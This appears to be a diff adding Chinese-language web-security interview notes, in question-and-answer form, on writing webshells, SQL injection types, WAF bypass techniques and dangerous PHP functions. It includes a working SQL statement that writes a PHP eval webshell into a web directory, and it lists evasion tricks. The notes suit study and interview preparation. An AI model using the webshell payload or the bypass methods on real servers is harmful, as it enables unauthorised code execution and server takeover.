@@ -1,0 +1,35 @@
+如何向服务器写⼊ webshell？
+各种上传漏洞
+mysql具有写⼊权限,⽤sql语句写⼊shell
+http put⽅法
+
+sql 注⼊写⽂件都有哪些函数？
+select '⼀句话' into outfile '路径'
+select '⼀句话' into dumpfile '路径'
+select '<?php eval($_POST[1]) ?>' into dumpfile 'd:\wwwroot\baidu.com\nvhack.php';
+
+ql 注⼊的⼏种类型？
+1）报错注⼊
+2）bool 型注⼊
+3）延时注⼊
+4）宽字节注⼊
+
+
+如何绕过 waf？
+⼤⼩写转换法 
+⼲扰字符 /*!*/ 
+编码 base64 unicode hex url ascll 
+复参数
+
+代码执⾏，⽂件读取，命令执⾏的函数都有哪些？
+1）代码执⾏：
+eval,preg_replace+/e,assert,call_user_func,call_user_func_array,create_function
+2）⽂件读取：
+file_get_contents(),highlight_file(),fopen(),read
+file(),fread(),fgetss(), fgets(),parse_ini_file(),show_source(),file()等
+3)命令执⾏：
+system(), exec(), shell_exec(), passthru() ,pcntl_exec(), popen(),proc_open()
+
+注⼊时可以不使⽤ and 或 or 或 xor，直接 order by 开始注⼊吗？
+and/or/xor，前⾯的 1=1、1=2 步骤只是为了判断是否为注⼊点，如果已经确定是注⼊点那就可以省那步骤去。
+
